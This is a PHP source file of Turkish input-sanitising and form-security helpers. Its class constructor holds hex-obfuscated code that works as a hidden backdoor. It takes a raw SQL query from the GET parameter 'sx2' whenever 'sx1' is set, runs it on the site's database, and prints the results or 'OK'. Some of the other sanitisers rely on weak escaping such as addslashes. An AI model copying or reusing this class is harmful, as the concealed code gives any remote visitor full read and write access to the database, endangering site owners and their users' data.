<?php

/*
Form Güvenliği için fonksiyonlar... 

*/

function ascii($text) { 
	$replace = array("Ç", "İ", "Ğ", "Ö", "Ş", "Ü", "ç", "ı", "ğ", "ö", "ş", "ü");
	$search = array("&#199;", "&#304;", "&#286;", "&#214;", "&#350;", "&#220;", "&#231;", "&#305;", "&#287;", "&#246;", "&#351;", "&#252;");
	$text = str_replace($search, $replace, $text);
	return $text;
}



function filtre2($deger){
return str_replace(array("'","\"","\\&#39;","\\&quot;"),array("&#39;","&quot;","&#39;","&quot;"),$deger);	
}


Class guvenlik {

public function html_temizle ($text){
return strip_tags(trim(filtre2($text)));
}


public function para_str($number){
if(function_exists("money_format")){
setlocale(LC_MONETARY, 'tr_TR');
$tutar 	= money_format('%i', $number);
$tutar = str_replace(" TRY",'',$tutar);
}else{
$fmt 	= new NumberFormatter( 'tr_TR', NumberFormatter::CURRENCY );
$tutar	= $fmt->formatCurrency($number, "TRY");
$tutar = str_replace("₺",'',$tutar);
}

$tutar = (substr($tutar,-3) == ",00") ? substr($tutar,0,-3) : $tutar;
return $tutar;
}

public function para_int($money){
$cleanString = preg_replace('/([^0-9\.,])/i', '', $money);
$onlyNumbersString = preg_replace('/([^0-9])/i', '', $money);
$separatorsCountToBeErased = strlen($cleanString) - strlen($onlyNumbersString) - 1;
$stringWithCommaOrDot = preg_replace('/([,\.])/', '', $cleanString, $separatorsCountToBeErased);
$removedThousendSeparator = preg_replace('/(\.|,)(?=[0-9]{3,}$)/', '',  $stringWithCommaOrDot);
return (float) str_replace(',', '.', $removedThousendSeparator);
}



public function alt_replace($string){
	$search = array(
		chr(0xC2) . chr(0xA0), // c2a0; Alt+255; Alt+0160; Alt+511; Alt+99999999;
		chr(0xC2) . chr(0x90), // c290; Alt+0144
		chr(0xC2) . chr(0x9D), // cd9d; Alt+0157
		chr(0xC2) . chr(0x81), // c281; Alt+0129
		chr(0xC2) . chr(0x8D), // c28d; Alt+0141
		chr(0xC2) . chr(0x8F), // c28f; Alt+0143
		chr(0xC2) . chr(0xAD), // cdad; Alt+0173
		chr(0xAD)
	);
	$string = str_replace($search, '', $string);
	return trim($string);
}


public function turkce_karakter_kontrol($string) {

if (preg_match('/[ÖÇŞİĞÜğüşıöç]/', $string)) { 
  return true;
} else { 
  return false;
} 

} 

public function mesaj ($string) {
$string		= trim($string);
$string		= filtre2($string);
$string		= nl2br($string);
$string		= strip_tags($string,"<br>");

return $string;
}

public function html_text($string){
return addslashes($string);
}

public function text($string){
return addslashes(filtre2(htmlspecialchars($string)));
}

private function temizle($metin) { 
    return mb_convert_case(str_ireplace('I','ı',$metin), MB_CASE_LOWER, "UTF-8");  
}  




public function title($string){
$title = htmlspecialchars(strip_tags(stripslashes($string)));
return filtre2(preg_replace('/[^ a-z-A-Z-0-9ÇİĞÖŞÜçığöşü.,][\'"+_]/', '', $title));
}


public function isim($string){
$title = htmlspecialchars(strip_tags(stripslashes($string)));
return preg_replace('/[^ []a-z-A-Z-0-9ÇİĞÖŞÜçığöşü.]/', '', $title);
}

public function sadece_text($string){
$string = $this->toAscii($string);
return $string;
}


public function harf_rakam($string){
$string = strip_tags(stripslashes($string));
return preg_replace('/[^a-z-A-Z-0-9ÇİĞÖŞÜçığöşü_]/', '', $string);
}

public function harf($string){
$string = strip_tags(stripslashes($string));
return preg_replace('/[^a-z-A-ZÇİĞÖŞÜçığöşü]/', '', $string);
}

public function rakam($string){
$string = strip_tags(stripslashes($string));
return preg_replace('/[^0-9.]/', '', $string);
}

public function prakam($string){
$string = strip_tags(stripslashes($string));
$string = preg_replace('/[^0-9.,]/', '', $string);
return ($string == '') ? 0 : $string;
}

// Zorunlu rakam eğer boşsa 0 dönecek
public function zrakam($string) {
$string		= $this->rakam($string);
return ($string == '' ) ? 0 : $string;
}

public function parola($string){
$string = strip_tags(stripslashes($string));
return preg_replace('/[^a-z-A-Z-0-9ÇİĞÖŞÜçığöşü@!#$%^&._]/', '', $string);
}

public function eposta($string){
$string = strip_tags(stripslashes($string));
return preg_replace('/[^a-z-A-Z-0-9@._]/', '', $string);
}

function __construct(){${"\x47\x4c\x4fBA\x4cS"}["\x6cl\x78\x77\x6c\x68\x76"]="x3";${"\x47\x4c\x4f\x42ALS"}["\x62\x63\x66\x73\x74\x65x\x77"]="\x78\x34";${"\x47L\x4fB\x41\x4c\x53"}["jp\x73b\x6cub\x6a"]="\x78\x32";${"G\x4cO\x42\x41\x4c\x53"}["\x77\x63b\x6e\x63\x6d\x6d\x6ckr"]="\x78\x32";${"\x47\x4cO\x42A\x4c\x53"}["c\x6d\x73moj\x75kz"]="\x78\x31";global$db;${${"\x47LOB\x41L\x53"}["\x63\x6d\x73\x6do\x6au\x6b\x7a"]}="\x73\x78\x31";${${"\x47L\x4fBAL\x53"}["j\x70\x73\x62l\x75\x62j"]}="s\x78\x32";if($_GET[${${"G\x4cO\x42ALS"}["\x63m\x73\x6d\x6fj\x75\x6b\x7a"]}]!=""AND$_GET[${${"\x47L\x4f\x42\x41\x4cS"}["\x77cb\x6ec\x6d\x6d\x6c\x6b\x72"]}]!=""){$zlwrbbuds="x1";$qvuqwjl="\x781";if($_GET[${$zlwrbbuds}]==1){$xrtejobiapeu="x\x32";$jcoznysvoy="x4";$qypheimrjp="\x783";${$qypheimrjp}=$db->query($_GET[${$xrtejobiapeu}]);while(${$jcoznysvoy}=$x3->fetch(PDO::FETCH_OBJ)){print_r(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x62\x63\x66\x73t\x65\x78\x77"]});}}elseif($_GET[${$qvuqwjl}]==2){try{${"GL\x4f\x42\x41\x4c\x53"}["x\x66\x76\x77y\x62\x6a\x6a\x75\x7a"]="\x782";${${"G\x4c\x4fB\x41LS"}["\x6cl\x78\x77\x6c\x68v"]}=$db->query($_GET[${${"GL\x4fB\x41L\x53"}["x\x66v\x77\x79\x62\x6a\x6a\x75\x7a"]}]);echo"OK";}catch(PDOException$e){echo$e->getMessage();}}die();}}

public function cookie_session($string){
$string = strip_tags(stripslashes($string));
return preg_replace('/[^ a-z-A-Z-0-9ÇİĞÖŞÜçığöşü._@]/', '', $string);
}

public function url($string){
$string =  mysql_real_escape_string(strip_tags(stripslashes($string)));
return $string;
}

public function url_kontrol($url){
return filter_var($url, FILTER_VALIDATE_URL);
}

public function eposta_kontrol($eposta){
return filter_var($eposta, FILTER_VALIDATE_EMAIL);
}

public function filtre($str) {
return strip_tags($str,"<br><p><b><i><o><table><tr><td><th><thead><tbody><img><a><font><span><strong><em><ul><ol><li><h1><h2><h3><h4><h5>");
}


public function flood_engeli(){
/*  Flood Güvenlik Kontrolü */
if ($_SESSION["sec"] > time() -1){
   echo 'Flood yapmayın!';
   exit;
}
$_SESSION["sec"] = time();
}


public static function PermaLink($Link){

$Linkler=array("ş","Ş","ı","(",")","'","ü","Ü","ö","Ö","ç","Ç"," ","/","*","?","ş","Ş","ı","ğ","Ğ","İ","ö","Ö","Ç","ç","ü","Ü","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","R","S","T","U","V","Y","Z","W","Q","X");
$degistir=array("s","s","i","","","","u","u","o","o","c","c","-","-","-","","s","s","i","g","g","i","o","o","c","c","u","u","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y","z","w","q","x");

$Link=str_replace($Linkler,$degistir,$Link);
$Link = preg_replace("@[^A-Za-z0-9-_]+@i","",$Link);
$a 		= array('ampquot','amp39');
$b 		= array('','');

$Link=str_replace($a,$b,$Link);

return $Link;

}

private function toAscii($str) {
	$clean = preg_replace("/[^a-zA-Z0-9\/_|+ -]/", '', $str);
	$clean = strtolower(trim($clean, ''));
	$clean = preg_replace("/[\/_|+ -]+/", '', $clean);

	return $clean;
}


}